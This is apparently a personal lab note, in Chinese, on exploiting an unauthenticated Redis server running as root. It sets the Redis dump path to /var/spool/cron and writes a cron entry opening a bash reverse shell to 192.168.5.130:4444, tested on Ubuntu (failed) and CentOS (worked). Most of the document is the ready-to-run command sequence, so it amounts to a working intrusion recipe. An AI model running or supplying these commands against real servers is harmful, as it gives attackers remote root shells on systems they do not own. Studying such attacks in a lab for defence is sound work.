# redis未授权利用crontal反弹shell

## 利用条件

redis以root身份运行

## 漏洞利用过程

### 靶机：ubuntu 16.04

#### 本机查看crontab所在位置

`find / -name cron`

![image-20210702111659943](.\images\image17.png)

#### 将redis备份路径修改为定时任务路径

`config set dir /var/spool/cron`

![image-20210702111938181](.\images\image18.png)

#### 修改备份文件名

`config set dbfilename root`

![image-20210702154210622](.\images\imag20.png)

#### 写入反弹shell的定时任务

`set x "\n\n\n* * * * * bash -i >& /dev/tcp/192.168.5.130/4444 ->&1\n\n\n"`

![image-20210702154308146](.\images\image21.png)

#### 结果未成功

### 靶机：CentOS

#### CentOS安装redis(编译安装)

出现安装不了工具的情况，换源

`https://www.cnblogs.com/yangyangming/p/12516780.html`

#### CentOS安装redis

`https://blog.csdn.net/anshaobiao6449/article/details/101121418`

```shell
wget http://download.redis.io/redis-stable.tar.gz
tar xzf redis-stable.tar.gz
cd /redis-stable
make
make install
```



#### 写入定时任务反弹shell

```
redis-cli -h 192.168.5.137
# config get dir
config set dir /var/spool/cron
# config get dbfilename
config set dbfilename root
set x "\n\n\n*/1 * * * * bash -i >& /dev/tcp/192.168.5.130/4444 0>&1\n\n\n"
save
```

![image-20210702162953011](.\images\image20.png)

![image-20210702162927829](.\images\image21.png)

### 坑

**crontab反弹debian,ubuntu都不行**，因为他们对计划任务的格式很严格，必须要执行
`crontab -u root /var/spool/cron/crontabs/root`
通过语法检查后，才能执行计划任务。

`https://www.cnblogs.com/twosmi1e/p/13308682.html`

